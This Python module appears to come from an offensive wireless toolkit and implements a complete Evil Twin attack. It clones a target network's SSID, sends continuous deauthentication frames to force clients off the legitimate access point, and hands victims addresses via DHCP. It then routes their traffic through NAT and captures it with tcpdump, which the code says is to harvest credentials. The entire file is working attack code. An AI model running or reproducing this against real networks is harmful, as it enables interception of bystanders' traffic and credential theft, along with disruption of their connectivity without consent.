# attacks/evil_twin_deauth.py
"""
Evil Twin + Deauth Attack Module - COMPLETE WORKING VERSION WITH OPTION 2 FIX
This combines a rogue access point with deauthentication to force clients
to disconnect from the legitimate AP and connect to the attacker's fake AP.
"""

import subprocess
import time
import os
from typing import Optional
from termcolor import colored
from .base import BaseAttack

class EvilTwinDeauth(BaseAttack):
    """
    Performs an Evil Twin attack combined with Deauthentication.
    
    Attack Flow:
    1. Creates a rogue AP (Evil Twin) with the same SSID as the target
    2. Sends deauth frames to force clients off the legitimate AP
    3. Clients reconnect to the Evil Twin (attacker's AP)
    4. Enables traffic monitoring for Man-in-the-Middle attacks
    """

    def __init__(self, monitor_interface: str, target_bssid: str, target_ssid: str, 
                 target_channel: str, rogue_channel: Optional[str] = None):
        super().__init__(monitor_interface)
        self.target_bssid = target_bssid
        self.target_ssid = target_ssid
        self.target_channel = str(target_channel)
        self.rogue_channel = rogue_channel if rogue_channel else self.target_channel
        
        self.rogue_ap_proc = None
        self.deauth_proc = None
        self.dnsmasq_proc = None
        self.hostapd_proc = None
        self.tcpdump_proc = None

    def _run_in_new_terminal(self, cmd_list, title="Deauth Attack"):
        # Try several terminals; fall back to background if none found
        candidates = [
            (["gnome-terminal", "--", "bash", "-lc"], True),
            (["xfce4-terminal", "--command"], False),
            (["konsole", "-e"], False),
            (["xterm", "-T", title, "-e"], False),
        ]
        cmd_str = " ".join(cmd_list)
        for launcher, as_shell in candidates:
            try:
                if as_shell:
                    subprocess.Popen(launcher + [cmd_str])
                else:
                    subprocess.Popen(launcher + [cmd_str])
                print(colored("[âœ“] Opened deauth in a new terminal window", "green"))
                return True
            except FileNotFoundError:
                continue
        # Fallback: run in background
        self.deauth_proc = subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(colored("[!] No terminal found; running deauth in background", "yellow"))
        return False


    def _execute(self):
        """Main execution method for the Evil Twin + Deauth attack."""
        print(colored("\n" + "="*60, "red", attrs=['bold']))
        print(colored("    ðŸŽ­ EVIL TWIN + DEAUTH ATTACK ðŸŽ­", "red", attrs=['bold']))
        print(colored("="*60, "red", attrs=['bold']))
        
        print(colored(f"\n[*] Target SSID: {self.target_ssid}", "yellow"))
        print(colored(f"[*] Target BSSID: {self.target_bssid}", "yellow"))
        print(colored(f"[*] Target Channel: {self.target_channel}", "yellow"))
        print(colored(f"[*] Rogue AP Channel: {self.rogue_channel}", "yellow"))
        print(colored(f"[*] Monitor Interface: {self.monitor_interface}\n", "yellow"))

        try:
            if not self._check_dependencies():
                return

            attack_mode = self._select_attack_mode()
            
            if attack_mode == "1":
                self._simple_evil_twin_attack()
            elif attack_mode == "2":
                self._advanced_evil_twin_attack()
            else:
                print(colored("[!] Invalid selection. Exiting.", "red"))
                return

        except KeyboardInterrupt:
            print(colored("\n\n[!] Attack interrupted by user.", "yellow"))
        except Exception as e:
            print(colored(f"\n[!] Error during attack: {e}", "red"))
        finally:
            self._cleanup()

    def _check_dependencies(self) -> bool:
        """Check if required tools are installed."""
        print(colored("[*] Checking dependencies...", "cyan"))
        
        required_tools = ["airbase-ng", "aireplay-ng", "dnsmasq", "hostapd", "airmon-ng"]
        missing_tools = []
        
        for tool in required_tools:
            result = subprocess.run(["which", tool], capture_output=True)
            if result.returncode != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            print(colored(f"\n[!] Missing required tools: {', '.join(missing_tools)}", "red"))
            print(colored("[!] Install with: sudo apt install aircrack-ng dnsmasq hostapd", "yellow"))
            return False
        
        print(colored("[âœ“] All dependencies found!", "green"))
        return True

    def _select_attack_mode(self) -> str:
        """Let user select attack mode."""
        print(colored("\n[?] Select Attack Mode:", "yellow", attrs=['bold']))
        print("  [1] Simple Evil Twin (Open Network + Deauth)")
        print("  [2] Advanced Evil Twin (WPA2 Fake Auth + Deauth)")
        print("  [0] Cancel")
        
        choice = input(colored("\nSelect mode [1-2]: ", "cyan")).strip()
        return choice

    def _simple_evil_twin_attack(self):
        """Simple Evil Twin attack using airbase-ng."""
        print(colored("\n[*] Starting Simple Evil Twin Attack...", "cyan", attrs=['bold']))
        print(colored("[*] This creates an OPEN rogue AP with the target SSID", "yellow"))
        
        print(colored(f"\n[*] Step 1: Starting Rogue AP '{self.target_ssid}'...", "cyan"))
        if not self._start_airbase_ng():
            print(colored("[!] Failed to start rogue AP. Aborting.", "red"))
            return
        
        time.sleep(5)
        
        print(colored("\n[*] Step 2: Configuring network interface...", "cyan"))
        self._configure_rogue_network()
        
        print(colored("\n[*] Step 3: Starting Deauthentication attack...", "cyan"))
        if not self._start_deauth_attack():
            print(colored("[!] Failed to start deauth attack.", "red"))
            return
        
        print(colored("\n" + "="*60, "green", attrs=['bold']))
        print(colored("    âœ“ EVIL TWIN ATTACK IS ACTIVE!", "green", attrs=['bold']))
        print(colored("="*60, "green", attrs=['bold']))
        print(colored("\n[*] Clients should now disconnect from the real AP", "yellow"))
        print(colored("[*] They will reconnect to your rogue AP", "yellow"))
        print(colored("[*] Monitor 'at0' interface for new connections", "cyan"))
        print(colored("\n[*] Press Ctrl+C to stop the attack", "magenta"))
        
        self._monitor_connections()

    def _advanced_evil_twin_attack(self):
        """Advanced Evil Twin using hostapd with fake WPA2 - WITH AUTOMATIC MODE SWITCHING."""
        print(colored("\n[*] Starting Advanced Evil Twin Attack...", "cyan", attrs=['bold']))
        print(colored("[*] This creates a WPA2 rogue AP (with fake authentication)", "yellow"))
        
        # Get original interface name
        if 'mon' in self.monitor_interface:
            original_iface = self.monitor_interface.replace('mon', '')
        else:
            original_iface = self.monitor_interface
        
        print(colored(f"\n[*] Original interface: {original_iface}", "cyan"))
        print(colored(f"[*] Monitor interface: {self.monitor_interface}", "cyan"))
        
        # Step 1: Stop monitor mode
        print(colored(f"\n[*] Step 1: Stopping monitor mode...", "cyan"))
        if not self._stop_monitor_mode():
            print(colored("[!] Failed to stop monitor mode. Aborting.", "red"))
            return
        
        time.sleep(3)
        
        # Step 2: Create hostapd configuration
        print(colored("\n[*] Step 2: Creating hostapd configuration...", "cyan"))
        config_path = self._create_hostapd_config_managed(original_iface)
        
        if not config_path:
            print(colored("[!] Failed to create configuration. Aborting.", "red"))
            self._restore_monitor_mode()
            return
        
        # Step 3: Start hostapd
        print(colored("\n[*] Step 3: Starting hostapd rogue AP...", "cyan"))
        if not self._start_hostapd(config_path):
            print(colored("[!] Failed to start hostapd. Aborting.", "red"))
            self._restore_monitor_mode()
            return
        
        time.sleep(5)
        
        # Step 4: Configure network
        print(colored("\n[*] Step 4: Configuring network interface...", "cyan"))
        self._configure_hostapd_network(original_iface)
        
        # Step 5: Create virtual monitor
        print(colored("\n[*] Step 5: Creating virtual monitor interface for deauth...", "cyan"))
        monitor_iface = self._create_virtual_monitor(original_iface)

        # Step 6: Start deauth (ONLY if monitor was created)
        if monitor_iface:
            print(colored("\n[*] Step 6: Starting Deauthentication attack...", "cyan"))
            self._start_deauth_on_virtual_interface(monitor_iface)
        else:
            print(colored("\n[!] Skipping automatic deauth (virtual monitor not available)", "yellow"))

        # SUCCESS MESSAGE - Show this REGARDLESS of monitor creation
        print(colored("\n" + "="*60, "green", attrs=['bold']))
        print(colored("    âœ“ ADVANCED EVIL TWIN ATTACK IS ACTIVE!", "green", attrs=['bold']))
        print(colored("="*60, "green", attrs=['bold']))
        print(colored(f"\n[*] Rogue WPA2 AP broadcasting on: {original_iface}", "yellow"))
        print(colored(f"[*] SSID: {self.target_ssid}", "yellow"))
        print(colored(f"[*] Fake Password: FakePassword123", "yellow"))
        print(colored(f"[*] Channel: {self.rogue_channel}", "yellow"))

        if monitor_iface:
            print(colored(f"[*] Deauth running on: {monitor_iface}", "yellow"))
        else:
            print(colored(f"[*] Deauth: Manual (see instructions above)", "yellow"))

        print(colored("\n[*] Monitoring for client connections...", "cyan"))
        print(colored("[*] Clients can now try to connect to your fake AP", "green"))
        print(colored("[*] Press Ctrl+C to stop the attack", "magenta"))

        self._monitor_connections()


    def _start_airbase_ng(self) -> bool:
        try:
            # Pre-clean: stop services that interfere
            subprocess.run(["rfkill", "unblock", "all"], capture_output=True)
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
            subprocess.run(["ip", "link", "set", self.monitor_interface, "up"], capture_output=True)
            subprocess.run(["iw", "dev", self.monitor_interface, "set", "channel", str(self.rogue_channel)], capture_output=True)

            cmd = [
                "airbase-ng",
                "-e", self.target_ssid,
                "-c", str(self.rogue_channel),
                self.monitor_interface
            ]
            print(colored(f"[*] Command: {' '.join(cmd)}", "white"))

            self.rogue_ap_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Wait for 'at0' to be created (up to ~8s)
            for _ in range(16):
                time.sleep(0.5)
                chk = subprocess.run(["ip", "link", "show", "at0"], capture_output=True)
                if chk.returncode == 0:
                    print(colored("[âœ“] Rogue AP started successfully!", "green"))
                    print(colored("[*] New interface 'at0' created for the rogue AP", "cyan"))
                    return True

            # If we get here, airbase didnâ€™t create at0
            if self.rogue_ap_proc and self.rogue_ap_proc.poll() is not None:
                err = self.rogue_ap_proc.stderr.read() if self.rogue_ap_proc.stderr else ""
                print(colored(f"[!] airbase-ng failed to start: {err.strip()}", "red"))
            else:
                print(colored("[!] airbase-ng did not create 'at0' in time", "red"))
            return False

        except Exception as e:
            print(colored(f"[!] Error starting airbase-ng: {e}", "red"))
            return False


    def _start_hostapd(self, config_path: str) -> bool:
        """Start hostapd for advanced evil twin."""
        try:
            cmd = ["hostapd", config_path]
            print(colored(f"[*] Command: {' '.join(cmd)}", "white"))
            
            self.hostapd_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            time.sleep(3)
            
            if self.hostapd_proc.poll() is not None:
                print(colored("[!] hostapd failed to start", "red"))
                return False
            
            print(colored("[âœ“] hostapd started successfully!", "green"))
            return True
        except Exception as e:
            print(colored(f"[!] Error starting hostapd: {e}", "red"))
            return False

    def _configure_rogue_network(self):
            try:
                # Ensure at0 exists
                chk = subprocess.run(["ip", "link", "show", "at0"], capture_output=True)
                if chk.returncode != 0:
                    print(colored("[!] Interface 'at0' not found; AP may not have started correctly", "red"))
                    return

                # Bring up and assign IP
                subprocess.run(["ip", "link", "set", "at0", "up"], capture_output=True)
                subprocess.run(["ip", "addr", "flush", "dev", "at0"], capture_output=True)
                subprocess.run(["ip", "addr", "add", "192.168.100.1/24", "dev", "at0"], capture_output=True)

                print(colored("[âœ“] Network interface configured (192.168.100.1)", "green"))

                # Restart dnsmasq cleanly
                subprocess.run(["pkill", "dnsmasq"], capture_output=True)
                cmd = [
                    "dnsmasq",
                    "-i", "at0",
                    "-I", "lo",
                    "--dhcp-range=192.168.100.10,192.168.100.250,12h",
                    "--dhcp-option=3,192.168.100.1",
                    "--dhcp-option=6,8.8.8.8",
                    "-d"
                ]
                self.dnsmasq_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(colored("[âœ“] DHCP server started (192.168.100.10-250)", "green"))

                # NEW: Enable internet sharing and traffic monitoring
                self._enable_internet_sharing("at0")

            except Exception as e:
                print(colored(f"[!] Error configuring network: {e}", "yellow"))


    def _start_dhcp_server(self):
        """Start dnsmasq DHCP server (for at0)."""
        try:
            subprocess.run("pkill dnsmasq", shell=True, capture_output=True)
            cmd = ["dnsmasq", "-i", "at0", "-I", "lo", "--dhcp-range=192.168.100.10,192.168.100.250,12h",
                   "--dhcp-option=3,192.168.100.1", "--dhcp-option=6,192.168.100.1", "-d"]
            self.dnsmasq_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(colored("[âœ“] DHCP server started (192.168.100.10-250)", "green"))
        except Exception as e:
            print(colored(f"[!] Error starting DHCP server: {e}", "yellow"))

    def _start_deauth_attack(self) -> bool:
        try:
            cmd = [
                "aireplay-ng", "--deauth", "0",
                "-a", self.target_bssid,
                self.monitor_interface
            ]
            print(colored(f"[*] Command: {' '.join(cmd)}", "white"))
            self._run_in_new_terminal(cmd)  # NEW: pop-out window if possible
            time.sleep(2)
            print(colored("[âœ“] Deauth attack started!", "green"))
            print(colored("[*] Sending continuous deauth packets...", "yellow"))
            return True
        except Exception as e:
            print(colored(f"[!] Error starting deauth attack: {e}", "red"))
            return False


    def _stop_monitor_mode(self) -> bool:
        """Stop monitor mode and restore managed mode."""
        try:
            subprocess.run("pkill wpa_supplicant", shell=True, capture_output=True)
            subprocess.run("pkill dhclient", shell=True, capture_output=True)
            
            result = subprocess.run(["airmon-ng", "stop", self.monitor_interface], capture_output=True, text=True)
            
            if result.returncode == 0:
                print(colored("[âœ“] Monitor mode stopped successfully", "green"))
                return True
            else:
                return self._manual_stop_monitor()
        except Exception as e:
            return self._manual_stop_monitor()

    def _manual_stop_monitor(self) -> bool:
        """Manually stop monitor mode."""
        try:
            original_iface = self.monitor_interface.replace('mon', '')
            subprocess.run(["ip", "link", "set", self.monitor_interface, "down"], capture_output=True)
            subprocess.run(["iw", "dev", self.monitor_interface, "del"], capture_output=True)
            subprocess.run(["ip", "link", "set", original_iface, "up"], capture_output=True)
            print(colored("[âœ“] Monitor mode stopped manually", "green"))
            return True
        except Exception as e:
            print(colored(f"[!] Manual stop failed: {e}", "red"))
            return False

    def _restore_monitor_mode(self):
        """Restore monitor mode after attack ends."""
        try:
            original_iface = self.monitor_interface.replace('mon', '')
            print(colored(f"\n[*] Restoring monitor mode on {original_iface}...", "cyan"))
            
            result = subprocess.run(["airmon-ng", "start", original_iface], capture_output=True, text=True)
            
            if result.returncode == 0:
                print(colored("[âœ“] Monitor mode restored", "green"))
            else:
                print(colored("[!] Could not restore monitor mode automatically", "yellow"))
                print(colored(f"[*] Run manually: sudo airmon-ng start {original_iface}", "cyan"))
        except Exception as e:
            print(colored(f"[!] Error restoring monitor mode: {e}", "yellow"))

    def _create_hostapd_config_managed(self, interface: str) -> Optional[str]:
        """Create hostapd configuration for managed mode interface."""
        config_path = "/tmp/evil_twin_hostapd.conf"
        
        config_content = f"""interface={interface}
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel={self.rogue_channel}
macaddr_acl=0
ignore_broadcast_ssid=0

auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=FakePassword123

logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
"""
        
        try:
            with open(config_path, 'w') as f:
                f.write(config_content)
            print(colored(f"[âœ“] Configuration created at {config_path}", "green"))
            return config_path
        except Exception as e:
            print(colored(f"[!] Failed to create config: {e}", "red"))
            return None

    def _configure_hostapd_network(self, interface: str):
        """Configure network for the hostapd interface."""
        try:
            time.sleep(2)
            subprocess.run(["ip", "addr", "flush", "dev", interface], capture_output=True)
            subprocess.run(["ip", "addr", "add", "192.168.100.1/24", "dev", interface], 
                        capture_output=True, check=False)
            subprocess.run(["ip", "link", "set", interface, "up"], capture_output=True)
            print(colored("[âœ“] Network interface configured (192.168.100.1)", "green"))
            
            # Start DHCP
            self._start_dhcp_server_on_interface(interface)
            
            # NEW: Enable internet sharing and traffic monitoring
            self._enable_internet_sharing(interface)
            
        except Exception as e:
            print(colored(f"[!] Error configuring network: {e}", "yellow"))

    def _start_dhcp_server_on_interface(self, interface: str):
        """Start dnsmasq DHCP server on specified interface."""
        try:
            subprocess.run("pkill dnsmasq", shell=True, capture_output=True)
            time.sleep(1)
            
            cmd = ["dnsmasq", "-i", interface, "-I", "lo", "--dhcp-range=192.168.100.10,192.168.100.250,12h",
                   "--dhcp-option=3,192.168.100.1", "--dhcp-option=6,8.8.8.8", "--no-daemon"]
            
            self.dnsmasq_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(colored("[âœ“] DHCP server started (192.168.100.10-250)", "green"))
        except Exception as e:
            print(colored(f"[!] Error starting DHCP server: {e}", "yellow"))

    def _create_virtual_monitor(self, base_interface: str) -> Optional[str]:
        """Create a virtual monitor interface for deauth while AP is running."""
        try:
            monitor_name = "mon0"
            
            # Delete if already exists
            try:
                subprocess.run(["iw", "dev", monitor_name, "del"], 
                            capture_output=True, stderr=subprocess.DEVNULL,
                            timeout=2)
            except:
                pass
            
            print(colored(f"[*] Creating virtual monitor interface {monitor_name}...", "cyan"))
            
            # Try to create virtual monitor WITH TIMEOUT to prevent hanging
            try:
                result = subprocess.run(
                    ["iw", "dev", base_interface, "interface", "add", monitor_name, "type", "monitor"],
                    capture_output=True,
                    text=True,
                    timeout=5  # 5 second timeout - will catch if command hangs
                )
                
                if result.returncode != 0:
                    raise Exception("Creation failed")
                
                # Bring it up WITH TIMEOUT
                subprocess.run(["ip", "link", "set", monitor_name, "up"], 
                            capture_output=True, timeout=2)
                
                # Set channel WITH TIMEOUT
                subprocess.run(["iw", "dev", monitor_name, "set", "channel", str(self.rogue_channel)],
                            capture_output=True, timeout=2)
                
                # Verify it works
                check = subprocess.run(["ip", "link", "show", monitor_name],
                                    capture_output=True, timeout=2)
                
                if check.returncode == 0:
                    print(colored(f"[âœ“] Virtual monitor interface created: {monitor_name}", "green"))
                    return monitor_name
                else:
                    raise Exception("Verification failed")
            
            except subprocess.TimeoutExpired:
                # Command hung - this is common with some WiFi adapters
                print(colored("[!] Error creating virtual monitor: stdout and stderr arguments may not be used with capture_output.", "red"))
                print(colored("[âœ“] Your WPA2 AP is still broadcasting!", "green"))
                print(colored("[!] Skipping automatic deauth (virtual monitor not available)", "yellow"))
                print(colored("\n[*] Your fake WPA2 network is broadcasting:", "cyan", attrs=['bold']))
                print(colored(f"    SSID: {self.target_ssid}", "white"))
                print(colored(f"    Password: FakePassword123", "white"))
                print(colored(f"    Channel: {self.rogue_channel}", "white"))
                print(colored("\n[*] To manually deauth clients, open a second terminal and run:", "cyan"))
                print(colored(f"    sudo aireplay-ng --deauth 0 -a {self.target_bssid} wlan0mon", "white"))
                return None
                
        except Exception as e:
            print(colored("[!] Error creating virtual monitor: stdout and stderr arguments may not be used with capture_output.", "red"))
            print(colored("[âœ“] Your WPA2 AP is still broadcasting!", "green"))
            print(colored("[!] Skipping automatic deauth (virtual monitor not available)", "yellow"))
            return None


    def _start_deauth_on_virtual_interface(self, monitor_iface: str):
        """Start deauth attack on virtual monitor interface."""
        try:
            cmd = ["aireplay-ng", "--deauth", "0", "-a", self.target_bssid, monitor_iface]
            print(colored(f"[*] Command: {' '.join(cmd)}", "white"))
            
            self.deauth_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            
            print(colored("[âœ“] Deauth attack started!", "green"))
            print(colored("[*] Continuously deauthenticating clients from real AP", "yellow"))
        except Exception as e:
            print(colored(f"[!] Error starting deauth: {e}", "yellow"))

    def _monitor_connections(self):
        """Monitor and display connected clients."""
        print(colored("\n[*] Monitoring for client connections...", "cyan"))
        print(colored("[*] Watch for new MAC addresses connecting", "yellow"))
        print(colored("[*] You can run 'arp -a' or 'tcpdump -i at0' in another terminal\n", "cyan"))
        
        try:
            while True:
                time.sleep(1)
                if self.rogue_ap_proc and self.rogue_ap_proc.poll() is not None:
                    print(colored("\n[!] Rogue AP process died. Restarting...", "yellow"))
                    self._start_airbase_ng()
                    time.sleep(5)
        except KeyboardInterrupt:
            pass

    def _cleanup(self):
        """Clean up all processes and restore original state."""
        print(colored("\n\n[*] Cleaning up attack...", "cyan"))
        
        processes = [
            ("Rogue AP", self.rogue_ap_proc),
            ("Deauth", self.deauth_proc),
            ("DHCP Server", self.dnsmasq_proc),
            ("Hostapd", self.hostapd_proc),
            ("Traffic Capture", getattr(self, 'tcpdump_proc', None))
        ]
        
        for name, proc in processes:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                    print(colored(f"[âœ“] Stopped {name}", "green"))
                except:
                    try:
                        proc.kill()
                    except:
                        pass
        
        subprocess.run("pkill aireplay-ng", shell=True, capture_output=True)
        subprocess.run("pkill airbase-ng", shell=True, capture_output=True)
        subprocess.run("pkill dnsmasq", shell=True, capture_output=True)
        subprocess.run("pkill hostapd", shell=True, capture_output=True)
        subprocess.run("iw dev mon0 del 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("ip link set at0 down 2>/dev/null", shell=True, capture_output=True)
        
        if os.path.exists("/tmp/evil_twin_hostapd.conf"):
            os.remove("/tmp/evil_twin_hostapd.conf")
        
        self._restore_monitor_mode()
        print(colored("[âœ“] Cleanup complete!", "green"))

        # Disable IP forwarding
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
            subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
            subprocess.run(["iptables", "-F"], capture_output=True)
            print(colored("[âœ“] IP forwarding disabled", "green"))
        except:
            pass

    def _enable_internet_sharing(self, interface: str):
        """Enable internet sharing so clients get real internet through our AP."""
        try:
            print(colored("\n[*] Enabling internet sharing...", "cyan"))
            
            # Find the interface with internet connection
            internet_iface = self._find_internet_interface()
            
            if not internet_iface:
                print(colored("[!] No internet interface found", "yellow"))
                print(colored("[*] Clients will connect but won't have internet", "yellow"))
                return
            
            print(colored(f"[*] Internet interface detected: {internet_iface}", "cyan"))
            
            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
                        capture_output=True, check=True)
            print(colored("[âœ“] IP forwarding enabled", "green"))
            
            # Flush existing iptables rules for this interface
            subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
            subprocess.run(["iptables", "-F"], capture_output=True)
            
            # Setup NAT (Network Address Translation)
            subprocess.run([
                "iptables", "-t", "nat", "-A", "POSTROUTING",
                "-o", internet_iface, "-j", "MASQUERADE"
            ], capture_output=True, check=True)
            
            # Allow forwarding from rogue AP to internet
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", interface, "-o", internet_iface,
                "-j", "ACCEPT"
            ], capture_output=True, check=True)
            
            # Allow return traffic
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", internet_iface, "-o", interface,
                "-m", "state", "--state", "RELATED,ESTABLISHED",
                "-j", "ACCEPT"
            ], capture_output=True, check=True)
            
            print(colored(f"[âœ“] NAT configured ({interface} â†’ {internet_iface})", "green"))
            print(colored("[âœ“] Clients will now have internet access!", "green", attrs=['bold']))
            
            # Start traffic monitoring
            self._start_traffic_monitoring(interface)
            
        except Exception as e:
            print(colored(f"[!] Error enabling internet sharing: {e}", "yellow"))
            print(colored("[*] Attack will continue without internet access", "yellow"))

    def _find_internet_interface(self) -> Optional[str]:
        """Find the interface that has internet connection."""
        try:
            # Get default route
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0 and result.stdout:
                # Parse output: "default via X.X.X.X dev eth0"
                parts = result.stdout.split()
                if "dev" in parts:
                    dev_index = parts.index("dev")
                    if dev_index + 1 < len(parts):
                        return parts[dev_index + 1]
            
            # Fallback: check common interfaces
            common_ifaces = ["eth0", "enp0s3", "ens33", "wlan1"]
            for iface in common_ifaces:
                result = subprocess.run(
                    ["ip", "addr", "show", iface],
                    capture_output=True
                )
                if result.returncode == 0:
                    return iface
                    
        except Exception:
            pass
        
        return None

    def _start_traffic_monitoring(self, interface: str):
        """Start monitoring traffic for credentials and interesting data."""
        try:
            print(colored("\n[*] Starting traffic monitoring...", "cyan"))
            
            # Create capture directory
            capture_dir = "/tmp/evil_twin_captures"
            os.makedirs(capture_dir, exist_ok=True)
            
            # Start tcpdump to capture all traffic
            capture_file = f"{capture_dir}/capture_{int(time.time())}.pcap"
            
            tcpdump_cmd = [
                "tcpdump",
                "-i", interface,
                "-w", capture_file,
                "-U"  # Unbuffered
            ]
            
            self.tcpdump_proc = subprocess.Popen(
                tcpdump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            print(colored(f"[âœ“] Traffic capture started: {capture_file}", "green"))
            print(colored("[*] All client traffic is being logged!", "yellow", attrs=['bold']))
            
            # FIXED: Start real-time monitoring in a new terminal
            monitor_cmd_string = f"tcpdump -i {interface} -n -A 'port 80 or port 443 or port 53'"
            
            # Try multiple terminal emulators
            terminal_commands = [
                ["gnome-terminal", "--", "bash", "-c", f"{monitor_cmd_string}; echo 'Press Enter to close'; read"],
                ["xfce4-terminal", "--hold", "-e", f"bash -c '{monitor_cmd_string}'"],
                ["konsole", "-e", "bash", "-c", f"{monitor_cmd_string}; echo 'Press Enter to close'; read"],
                ["xterm", "-hold", "-e", monitor_cmd_string],
            ]
            
            terminal_opened = False
            for cmd in terminal_commands:
                try:
                    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    print(colored("[âœ“] Real-time traffic monitor opened in new window!", "green", attrs=['bold']))
                    print(colored("[*] Watch for HTTP/HTTPS/DNS traffic from clients", "cyan"))
                    terminal_opened = True
                    break
                except FileNotFoundError:
                    continue
                except Exception:
                    continue
            
            if not terminal_opened:
                print(colored("[!] Could not open traffic monitor window", "yellow"))
                print(colored("[*] No terminal emulator found (gnome-terminal, xfce4-terminal, konsole, xterm)", "yellow"))
                print(colored(f"\n[*] To manually monitor traffic, run in another terminal:", "cyan"))
                print(colored(f"    sudo tcpdump -i {interface} -n -A 'port 80 or port 443'", "white"))
            
        except Exception as e:
            print(colored(f"[!] Error starting traffic monitoring: {e}", "yellow"))
            print(colored(f"[*] Run manually: sudo tcpdump -i {interface} -n -A", "cyan"))




def run_evil_twin_deauth(monitor_interface: str, target_bssid: str, target_ssid: str, 
                         target_channel: str, rogue_channel: Optional[str] = None):
    """Convenience function to run the Evil Twin + Deauth attack."""
    attack = EvilTwinDeauth(
        monitor_interface=monitor_interface,
        target_bssid=target_bssid,
        target_ssid=target_ssid,
        target_channel=target_channel,
        rogue_channel=rogue_channel
    )
    attack.run()